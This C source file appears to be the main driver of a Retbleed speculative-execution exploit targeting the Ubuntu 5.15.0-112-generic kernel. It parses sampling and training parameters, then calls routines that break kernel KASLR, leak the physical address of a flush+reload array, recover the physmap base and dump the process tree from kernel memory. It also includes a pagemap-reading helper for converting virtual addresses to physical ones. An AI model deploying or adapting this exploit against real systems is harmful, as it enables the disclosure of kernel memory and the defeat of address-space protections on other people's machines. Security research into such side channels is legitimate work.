/* SPDX-License-Identifier: GPL-3.0-only */
#define _GNU_SOURCE

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <time.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/utsname.h>

#include "defs.h"
#include "proclist.h"
#include "retbleed.h"

#define fatal(...) err(EXIT_FAILURE, __VA_ARGS__)
#define fatalx(...) errx(EXIT_FAILURE, __VA_ARGS__)

/*
 * Convert a virtual address to a physical address. This requires root and no
 * sandbox. Used for testing.
 */
static u64 virt_to_phys_cheat(const void *addr)
{
    uint64_t val;

	uint64_t vfn = ((uint64_t)addr) >> PAGE_SHIFT;
	uint64_t offset = ((uint64_t)addr) & ((PAGE_SIZE - 1));

	int fd = open("/proc/self/pagemap", O_RDONLY);
	if (fd < 0) {
		fatal("open pagemap");
	}

	if (lseek(fd, vfn << 3, SEEK_SET) < 0) {
		fatal("lseek pagemap");
	}

	if (read(fd, &val, sizeof(val)) != sizeof(val)) {
		fatal("read pagemap");
	}

	close(fd);

	return (val << PAGE_SHIFT) | offset;
}

static int utsname_to_version(const struct utsname *utsname)
{
    if (utsname == NULL) {
        return -1;
    }

    if (strcmp(utsname->release, "5.15.0-112-generic") == 0) {
        return KERNEL_VERSION_UBUNTU_5_15_0_112_GENERIC;
    }

    return -1;
}

static noreturn void usage(const char *name)
{
    fprintf(stderr, "Usage: %s [options]\nOptions:\n", name);
    fprintf(stderr,
        "\t-s, --samples <number of samples for flush+reload>\n"
        "\t-t, --training_iter <number of iterations for training>\n"
        "\t-b, --brute_iter <number of samples for bruteforcing>\n"
    );
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
    u64 samples = 0;
    u64 training_iter = 0;
    u64 brute_iter = 0;

    for (;;) {
        static const struct option long_options[] = {
            {"samples", required_argument, NULL, 's'},
            {"training_iter", required_argument, NULL, 't'},
            {"brute_iter", required_argument, NULL, 'b'},
            {0},
        };

        int c = getopt_long(argc, argv, "s:t:b:", long_options, NULL);
        if (c == -1) {
            break;
        }

        switch (c) {
        case 's':
            errno = 0;
            samples = strtoul(optarg, NULL, 0);
            if (errno != 0) {
                usage(argv[0]);
            }
            break;

        case 't':
            errno = 0;
            training_iter = strtoul(optarg, NULL, 0);
            if (errno != 0) {
                usage(argv[0]);
            }
            break;

        case 'b':
            errno = 0;
            brute_iter = strtoul(optarg, NULL, 0);
            if (errno != 0) {
                usage(argv[0]);
            }
            break;

        default:
            fprintf(stderr, "getopt_long returned %d\n", c);
            usage(argv[0]);
        }
    }

    if (samples == 0 || training_iter == 0 || brute_iter == 0) {
        usage(argv[0]);
    }

    struct utsname utsname;
    if (uname(&utsname) < 0) {
        fatal("uname");
    }

    int kernel_version = utsname_to_version(&utsname);
    if (kernel_version == -1) {
        fatalx("unsupported kernel version %s", utsname.release);
    }

    struct retbleed retbleed;
    if (retbleed_init(&retbleed, samples, kernel_version, training_iter, brute_iter) < 0) {
        fatalx("%s", retbleed.error);
    }

    u64 kaslr_base = retbleed_break_text_kaslr(&retbleed);
    printf("[+] KASLR base: %#lx\n", kaslr_base);

    retbleed_init_training(&retbleed);

    if (retbleed_find_fr_pa(&retbleed) == UINT64_MAX) {
        fatalx("Failed to leak F/R array PA");
    }

    printf("[+] F/R array PA: %#lx\n", retbleed.fr_array_pa);
    u64 physmap_base = retbleed_break_physmap_kaslr(&retbleed);
    if (physmap_base == UINT64_MAX) {
        fatalx("Failed to leak physmap base");
    }
    printf("[+] physmap base: %#lx\n", physmap_base);

    print_process_tree(&retbleed);

    retbleed_finish(&retbleed);
}
